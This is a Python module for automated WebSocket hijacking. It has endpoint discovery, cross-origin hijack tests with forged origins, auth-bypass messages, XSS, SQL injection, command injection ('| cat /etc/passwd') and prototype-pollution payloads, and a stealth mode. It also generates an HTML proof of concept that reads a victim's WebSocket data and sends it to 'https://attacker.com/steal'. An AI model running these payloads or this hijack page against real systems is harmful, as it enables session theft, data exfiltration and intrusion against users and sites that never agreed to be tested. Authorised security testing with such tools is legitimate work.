"""
WebSocket Hijack Automation Module
Automated WebSocket security testing and hijacking
"""
import asyncio
import websockets
import json
import ssl
import random
import string
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import aiohttp

class WebSocketHijacker:
    """Automated WebSocket hijacking and security testing"""
    
    def __init__(self, target: str, stealth_mode: bool = False):
        self.target = target
        self.stealth_mode = stealth_mode
        self.findings: List[Dict] = []
        self.intercepted_messages: List[Dict] = []
        
        parsed = urlparse(target)
        if parsed.scheme == "https":
            self.ws_url = f"wss://{parsed.netloc}{parsed.path or '/'}"
        elif parsed.scheme == "http":
            self.ws_url = f"ws://{parsed.netloc}{parsed.path or '/'}"
        else:
            self.ws_url = target
        
        self.common_ws_paths = [
            "/ws",
            "/websocket",
            "/socket",
            "/socket.io/",
            "/sockjs/",
            "/signalr/",
            "/api/ws",
            "/api/websocket",
            "/live",
            "/stream",
            "/events",
            "/notifications",
            "/chat",
            "/realtime"
        ]
        
        self.test_payloads = {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            "sqli": [
                "' OR '1'='1",
                "1; DROP TABLE users--",
                "UNION SELECT * FROM users--"
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "$(whoami)"
            ],
            "json_injection": [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                '{"admin": true, "role": "superuser"}'
            ]
        }
    
    async def discover_websockets(self) -> List[str]:
        """Discover WebSocket endpoints"""
        discovered = []
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in self.common_ws_paths:
            ws_url = f"{'wss' if parsed.scheme == 'https' else 'ws'}://{parsed.netloc}{path}"
            
            try:
                async with websockets.connect(ws_url, close_timeout=5) as ws:
                    discovered.append(ws_url)
                    self.findings.append({
                        "type": "WebSocket Endpoint Discovered",
                        "url": ws_url,
                        "severity": "Info"
                    })
            except websockets.exceptions.InvalidStatusCode as e:
                if e.status_code == 101:
                    discovered.append(ws_url)
            except:
                pass
            
            if self.stealth_mode:
                await asyncio.sleep(0.5)
        
        return discovered
    
    async def test_cross_origin(self, ws_url: str = None) -> Dict:
        """Test for Cross-Site WebSocket Hijacking (CSWSH)"""
        ws_url = ws_url or self.ws_url
        
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "file://",
            "https://localhost",
            "https://127.0.0.1"
        ]
        
        vulnerable_origins = []
        
        for origin in test_origins:
            try:
                async with websockets.connect(
                    ws_url,
                    origin=origin,
                    close_timeout=5
                ) as ws:
                    await ws.send('{"type": "ping"}')
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=3)
                        vulnerable_origins.append({
                            "origin": origin,
                            "response": response[:200]
                        })
                    except asyncio.TimeoutError:
                        vulnerable_origins.append({
                            "origin": origin,
                            "response": "Connection accepted, no response"
                        })
            except Exception as e:
                pass
            
            if self.stealth_mode:
                await asyncio.sleep(0.3)
        
        if vulnerable_origins:
            self.findings.append({
                "type": "Cross-Site WebSocket Hijacking",
                "url": ws_url,
                "vulnerable_origins": vulnerable_origins,
                "severity": "Critical"
            })
        
        return {
            "url": ws_url,
            "vulnerable": len(vulnerable_origins) > 0,
            "origins": vulnerable_origins
        }
    
    async def test_authentication(self, ws_url: str = None) -> Dict:
        """Test WebSocket authentication"""
        ws_url = ws_url or self.ws_url
        
        results = {
            "no_auth_required": False,
            "token_in_url": False,
            "auth_bypass_possible": False
        }
        
        try:
            async with websockets.connect(ws_url, close_timeout=5) as ws:
                await ws.send('{"type": "get_user_data"}')
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=3)
                    response_data = json.loads(response) if response else {}
                    
                    if "error" not in str(response).lower() and "unauthorized" not in str(response).lower():
                        results["no_auth_required"] = True
                        self.findings.append({
                            "type": "WebSocket No Authentication",
                            "url": ws_url,
                            "severity": "High",
                            "evidence": response[:200]
                        })
                except:
                    pass
        except:
            pass
        
        auth_bypass_messages = [
            '{"token": "null"}',
            '{"token": ""}',
            '{"auth": "bypass"}',
            '{"user_id": 1, "admin": true}',
            '{"role": "admin"}'
        ]
        
        for msg in auth_bypass_messages:
            try:
                async with websockets.connect(ws_url, close_timeout=5) as ws:
                    await ws.send(msg)
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=3)
                        if "success" in str(response).lower() or "admin" in str(response).lower():
                            results["auth_bypass_possible"] = True
                            self.findings.append({
                                "type": "WebSocket Authentication Bypass",
                                "url": ws_url,
                                "payload": msg,
                                "severity": "Critical",
                                "evidence": response[:200]
                            })
                    except:
                        pass
            except:
                pass
        
        return results
    
    async def test_injection(self, ws_url: str = None) -> List[Dict]:
        """Test for injection vulnerabilities in WebSocket messages"""
        ws_url = ws_url or self.ws_url
        injection_findings = []
        
        for injection_type, payloads in self.test_payloads.items():
            for payload in payloads:
                message_templates = [
                    f'{{"message": "{payload}"}}',
                    f'{{"data": "{payload}"}}',
                    f'{{"content": "{payload}"}}',
                    f'{{"input": "{payload}"}}',
                    payload
                ]
                
                for msg in message_templates:
                    try:
                        async with websockets.connect(ws_url, close_timeout=5) as ws:
                            await ws.send(msg)
                            try:
                                response = await asyncio.wait_for(ws.recv(), timeout=3)
                                
                                if self._detect_injection_success(injection_type, payload, response):
                                    finding = {
                                        "type": f"WebSocket {injection_type.upper()} Injection",
                                        "url": ws_url,
                                        "payload": msg,
                                        "response": response[:300],
                                        "severity": "High" if injection_type in ["sqli", "command_injection"] else "Medium"
                                    }
                                    injection_findings.append(finding)
                                    self.findings.append(finding)
                            except:
                                pass
                    except:
                        pass
                
                if self.stealth_mode:
                    await asyncio.sleep(0.3)
        
        return injection_findings
    
    def _detect_injection_success(self, injection_type: str, payload: str, response: str) -> bool:
        """Detect if injection was successful"""
        response_lower = response.lower()
        
        if injection_type == "xss":
            return payload.lower() in response_lower or "script" in response_lower
        elif injection_type == "sqli":
            indicators = ["error", "syntax", "sql", "mysql", "postgresql", "oracle", "sqlite"]
            return any(ind in response_lower for ind in indicators)
        elif injection_type == "command_injection":
            indicators = ["root:", "uid=", "bin/", "etc/"]
            return any(ind in response_lower for ind in indicators)
        elif injection_type == "json_injection":
            return "admin" in response_lower and "true" in response_lower
        
        return False
    
    async def intercept_messages(self, ws_url: str = None, duration: int = 30) -> List[Dict]:
        """Intercept and log WebSocket messages"""
        ws_url = ws_url or self.ws_url
        messages = []
        
        try:
            async with websockets.connect(ws_url, close_timeout=5) as ws:
                end_time = asyncio.get_event_loop().time() + duration
                
                while asyncio.get_event_loop().time() < end_time:
                    try:
                        message = await asyncio.wait_for(ws.recv(), timeout=5)
                        msg_data = {
                            "direction": "incoming",
                            "data": message[:1000],
                            "timestamp": asyncio.get_event_loop().time()
                        }
                        messages.append(msg_data)
                        self.intercepted_messages.append(msg_data)
                        
                        sensitive = self._check_sensitive_data(message)
                        if sensitive:
                            self.findings.append({
                                "type": "Sensitive Data in WebSocket",
                                "url": ws_url,
                                "data_types": sensitive,
                                "severity": "High"
                            })
                    except asyncio.TimeoutError:
                        continue
                    except websockets.exceptions.ConnectionClosed:
                        break
        except Exception as e:
            pass
        
        return messages
    
    def _check_sensitive_data(self, message: str) -> List[str]:
        """Check for sensitive data patterns in messages"""
        sensitive_patterns = {
            "credit_card": r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
            "ssn": r'\b\d{3}-\d{2}-\d{4}\b',
            "email": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            "api_key": r'(api[_-]?key|apikey|token)["\']?\s*[:=]\s*["\']?[\w-]{20,}',
            "password": r'(password|passwd|pwd)["\']?\s*[:=]\s*["\']?[\w!@#$%^&*]{6,}',
            "jwt": r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+'
        }
        
        found = []
        import re
        for name, pattern in sensitive_patterns.items():
            if re.search(pattern, message, re.IGNORECASE):
                found.append(name)
        
        return found
    
    async def hijack_session(self, ws_url: str = None, victim_token: str = None) -> Dict:
        """Attempt to hijack WebSocket session"""
        ws_url = ws_url or self.ws_url
        
        hijack_result = {
            "success": False,
            "method": None,
            "evidence": None
        }
        
        session_messages = [
            '{"action": "steal_session"}',
            '{"type": "get_session"}',
            '{"command": "session_info"}',
            '{"request": "user_session"}'
        ]
        
        try:
            async with websockets.connect(ws_url, close_timeout=5) as ws:
                for msg in session_messages:
                    await ws.send(msg)
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=3)
                        if "session" in response.lower() or "token" in response.lower():
                            hijack_result = {
                                "success": True,
                                "method": "session_disclosure",
                                "evidence": response[:500]
                            }
                            self.findings.append({
                                "type": "WebSocket Session Hijack",
                                "url": ws_url,
                                "method": "session_disclosure",
                                "severity": "Critical",
                                "evidence": response[:300]
                            })
                            break
                    except:
                        pass
        except:
            pass
        
        return hijack_result
    
    def generate_hijack_payload(self) -> str:
        """Generate Cross-Site WebSocket Hijacking payload"""
        return f"""
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var ws = new WebSocket('{self.ws_url}');
ws.onopen = function() {{
    console.log('WebSocket Connected');
    ws.send(JSON.stringify({{type: 'get_sensitive_data'}}));
}};
ws.onmessage = function(event) {{
    console.log('Received:', event.data);
    // Exfiltrate data
    new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(event.data);
}};
ws.onerror = function(error) {{
    console.log('WebSocket Error:', error);
}};
</script>
</body>
</html>
"""
    
    async def full_scan(self) -> Dict:
        """Perform full WebSocket security scan"""
        results = {
            "discovered_endpoints": [],
            "cross_origin_vulnerable": [],
            "auth_issues": [],
            "injection_vulnerabilities": [],
            "findings": []
        }
        
        results["discovered_endpoints"] = await self.discover_websockets()
        
        for ws_url in results["discovered_endpoints"]:
            cors_result = await self.test_cross_origin(ws_url)
            if cors_result["vulnerable"]:
                results["cross_origin_vulnerable"].append(cors_result)
            
            auth_result = await self.test_authentication(ws_url)
            if any(auth_result.values()):
                results["auth_issues"].append({"url": ws_url, **auth_result})
            
            injection_result = await self.test_injection(ws_url)
            if injection_result:
                results["injection_vulnerabilities"].extend(injection_result)
        
        results["findings"] = self.findings
        
        return results
    
    def get_report(self) -> Dict:
        """Generate WebSocket security report"""
        return {
            "target": self.target,
            "ws_url": self.ws_url,
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f.get("severity") == "Critical"]),
            "high": len([f for f in self.findings if f.get("severity") == "High"]),
            "findings": self.findings,
            "intercepted_messages": len(self.intercepted_messages)
        }
